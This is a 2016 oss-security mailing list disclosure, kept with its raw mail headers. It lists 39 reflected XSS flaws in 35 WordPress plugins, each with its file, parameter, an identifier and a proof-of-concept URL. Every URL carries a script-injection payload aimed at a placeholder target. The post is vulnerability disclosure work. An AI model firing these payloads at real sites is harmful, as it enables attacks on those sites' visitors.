X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["11466" "Tuesday" "12" "April" "2016" "08:48:01" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>" "176" "[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." "^Date:" nil nil "4" "2016041212:48:01" "[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." (number mark "        larry0@me.co Apr 12  176/11466 " thread-indent "\"[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 22176 invoked by uid 550); 12 Apr 2016 12:48:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 22152 invoked from network); 12 Apr 2016 12:48:24 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-04-12_05:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1510270003 definitions=main-1604120180
Content-type: text/plain; charset=us-ascii
Content-transfer-encoding: quoted-printable
Message-id: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
MIME-version: 1.0 (Mac OS X Mail 9.2 \(3112\))
X-Mailer: Apple Mail (2.3112)
Date: Tue, 12 Apr 2016 08:48:01 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.
To: Open Source Security <oss-security@lists.openwall.com>

Hello List,


This was a project I worked on as part of my research in Akamai's SIRT, I i=
nitially found 1352 suspect XSS vulnerabilities but Wordpress escapes super=
 globals GET/POST/REQUEST
https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the ti=
me, so now I have a database of vulnerabilities that are context dependent =
and would need to be examined
individually.  I managed to automate XSS testing against the database and o=
f 1352 39 successfully executed javascript.  These are those 39, I've manua=
lly verified they're still vulnerable.

They're available here http://www.vapidlabs.com/wp/wp.php

I notified Wordpress back in February of my research.


Plugin:https://wordpress.org/plugins/mousewheel-smooth-scroll File:./mousew=
heel-smooth-scroll/js/wpmss.php Parameter:ease  speed step CVE-2016-77447 P=
oC:hxxp://[target]/wp-content/plugins/mousewheel-smooth-scroll/js/wpmss.php=
?step=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js/i=
ndexisto-inject.php Parameter:indexisto_index CVE-2016-77360 PoC:hxxp://[ta=
rget]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexisto=
_index=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/prettypre File:./prettypre/prettyprecs=
s.php Parameter:ts CVE-2016-77548 PoC:hxxp://[target]/wp-content/plugins/pr=
ettypre/prettyprecss.php?ts=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-plug=
in.php Parameter:plugin CVE-2016-77799 PoC:hxxp://[target]/wp-content/plugi=
ns/whizz/plugins/delete-plugin.php?plugin=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/mypuzzle-jigsaw File:./mypuzzle-jigsaw=
/getGallery.php Parameter:callback CVE-2016-77465 PoC:hxxp://[target]/wp-co=
ntent/plugins/mypuzzle-jigsaw/getGallery.php?callback=3D"><script>alert(1);=
</script><"
Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiarism=
/js.php Parameter:m CVE-2016-77035 PoC:hxxp://[target]/wp-content/plugins/a=
nti-plagiarism/js.php?m=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/qoate-scroll-triggered-box File:./qoat=
e-scroll-triggered-box/assets/js/script.php Parameter:anim perc sac vpos CV=
E-2016-77559 PoC:hxxp://[target]/wp-content/plugins/qoate-scroll-triggered-=
box/assets/js/script.php?anim=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video-m=
anagement/preview_video.php Parameter:media CVE-2016-77600 PoC:hxxp://[targ=
et]/wp-content/plugins/s3-video/views/video-management/preview_video.php?me=
dia=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-sea=
rch-engine/classes/extensions/managed-solr-servers/templates/template-my-ac=
counts.php Parameter:page  tab CVE-2016-77958 PoC:hxxp://[target]/wp-conten=
t/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/temp=
lates/template-my-accounts.php?page=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layout=
-builder/includes/layout-settings.php Parameter:layout_settings_id CVE-2016=
-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/includes/=
layout-settings.php?layout_settings_id=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/mypuzzle-sliding File:./mypuzzle-slidi=
ng/getGallery.php Parameter:callback CVE-2016-77466 PoC:hxxp://[target]/wp-=
content/plugins/mypuzzle-sliding/getGallery.php?callback=3D"><script>alert(=
1);</script><"
Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_sel=
ect.php Parameter:date-from date-to CVE-2016-77217 PoC:hxxp://[target]/wp-c=
ontent/plugins/e-search/tmpl/date_select.php?date-from=3D"><script>alert(1)=
;</script><"
Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_az=
.php Parameter:title_az CVE-2016-77217 PoC:hxxp://[target]/wp-content/plugi=
ns/e-search/tmpl/title_az.php?title_az=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/pop=
up-insert-help.php Parameter:galleryId id  tidio-gallery CVE-2016-77727 PoC=
:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?gal=
leryId=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php P=
arameter:font size CVE-2016-77506 PoC:hxxp://[target]/wp-content/plugins/pa=
rsi-font/css.php?size=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./def=
a-online-image-protector/redirect.php Parameter:r CVE-2016-77193 PoC:hxxp:/=
/[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r=3D"=
><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-fire=
work/firework/index.php Parameter:music text url CVE-2016-77475 PoC:hxxp://=
[target]/wp-content/plugins/new-year-firework/firework/index.php?text=3D"><=
script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-reserv=
eren/edit.php Parameter:page CVE-2016-77628 PoC:hxxp://[target]/wp-content/=
plugins/simpel-reserveren/edit.php?page=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/groupon-widget File:./groupon-widget/w=
idget.css.php Parameter:grpn_wdgt_get_it_btn_background grpn_wdgt_link_colo=
r grpn_wdgt_price_tag_background grpn_wdgt_shell_background grpn_wdgt_text_=
color grpn_wdgt_title_color CVE-2016-77332 PoC:hxxp://[target]/wp-content/p=
lugins/groupon-widget/widget.css.php?grpn_wdgt_shell_background=3D"><script=
>alert(1);</script><"
Plugin:https://wordpress.org/plugins/wp-notifications File:./wp-notificatio=
ns/css/ln_livenotifications_css.php Parameter:banner_bgcolor dropdown_bit_b=
gcolor dropdown_bit_color dropdown_boder_color dropdown_color dropdown_hove=
r_bgcolor dropdown_link_color CVE-2016-77885 PoC:hxxp://[target]/wp-content=
/plugins/wp-notifications/css/ln_livenotifications_css.php?dropdown_color=
=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/wp-latest-posts File:./wp-latest-posts=
/js/wpcufpn_front.js.php Parameter:id CVE-2016-77873 PoC:hxxp://[target]/wp=
-content/plugins/wp-latest-posts/js/wpcufpn_front.js.php?id=3D"><script>ale=
rt(1);</script><"
Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-po=
st/js.php Parameter:count interval CVE-2016-77022 PoC:hxxp://[target]/wp-co=
ntent/plugins/ajax-random-post/js.php?interval=3D"><script>alert(1);</scrip=
t><"
Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-ed=
itor/css.php Parameter:font size CVE-2016-77009 PoC:hxxp://[target]/wp-cont=
ent/plugins/admin-font-editor/css.php?size=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.php =
Parameter:playlist CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/hd=
w-tube/playlist.php?playlist=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.php=
 Parameter:channel CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/hd=
w-tube/mychannel.php?channel=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/lbak-google-checkout File:./lbak-googl=
e-checkout/css/googlecheckout.php Parameter:ih iw ph pw tc CVE-2016-77395 P=
oC:hxxp://[target]/wp-content/plugins/lbak-google-checkout/css/googlechecko=
ut.php?pw=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/razuna-media-manager File:./razuna-med=
ia-manager/pages/ajax/razuna-upload-callback.php Parameter:message response=
code CVE-2016-77577 PoC:hxxp://[target]/wp-content/plugins/razuna-media-man=
ager/pages/ajax/razuna-upload-callback.php?responsecode=3D"><script>alert(1=
);</script><"
Plugin:https://wordpress.org/plugins/mypuzzle-find-the-pair-a-memory-game F=
ile:./mypuzzle-find-the-pair-a-memory-game/ftpair-getCardImages.php Paramet=
er:callback CVE-2016-77464 PoC:hxxp://[target]/wp-content/plugins/mypuzzle-=
find-the-pair-a-memory-game/ftpair-getCardImages.php?callback=3D"><script>a=
lert(1);</script><"
Plugin:https://wordpress.org/plugins/surveymonkey-button File:./surveymonke=
y-button/start_survey.php Parameter:jqueryPepPath CVE-2016-77702 PoC:hxxp:/=
/[target]/wp-content/plugins/surveymonkey-button/start_survey.php?jqueryPep=
Path=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/vie=
ws/dashboard/index.php Parameter:p v CVE-2016-77341 PoC:hxxp://[target]/wp-=
content/plugins/hero-maps-pro/views/dashboard/index.php?v=3D"><script>alert=
(1);</script><"
Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpress-=
social-network/css/ln_livenotifications_css.php Parameter:banner_bgcolor dr=
opdown_bit_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color d=
ropdown_hover_bgcolor dropdown_link_color CVE-2016-77074 PoC:hxxp://[target=
]/wp-content/plugins/bbpress-social-network/css/ln_livenotifications_css.ph=
p?dropdown_color=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpress-=
social-network/css/ln_livenotifications_cssback.php Parameter:banner_bgcolo=
r dropdown_bgcolor dropdown_bit_bgcolor dropdown_bit_color dropdown_boder_c=
olor dropdown_color dropdown_hover_bgcolor dropdown_link_color CVE-2016-770=
74 PoC:hxxp://[target]/wp-content/plugins/bbpress-social-network/css/ln_liv=
enotifications_cssback.php?dropdown_bgcolor=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
inc/pages/edit_styles.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target]/=
wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid=3D"><sc=
ript>alert(1);</script><"
Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
inc/pages/build.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target]/wp-con=
tent/plugins/photoxhibit/common/inc/pages/build.php?gid=3D"><script>alert(1=
);</script><"
Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formmail=
/pages/admin-mail-info.php Parameter:itemid CVE-2016-77532 PoC:hxxp://[targ=
et]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=3D"=
><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-tr=
ackr_abtest_add.php Parameter:id N  WPSLT CVE-2016-77339 PoC:hxxp://[target=
]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=3D"><script>=
alert(1);</script><"
Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-ins=
ert-help.php Parameter:formId id  tidio-form CVE-2016-77726 PoC:hxxp://[tar=
get]/wp-content/plugins/tidio-form/popup-insert-help.php?formId=3D"><script=
>alert(1);</script><"
Plugin:https://wordpress.org/plugins/simplified-content File:./simplified-c=
ontent/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVE-2016-776=
42 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframework=
/js/ajax/OOAAjax.js.php?ajaxURL=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Infus=
ionsoft/examples/leadscoring.php Parameter:ContactId CVE-2016-77364 PoC:hxx=
p://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadscor=
ing.php?ContactId=3D"><script>alert(1);</script><"=
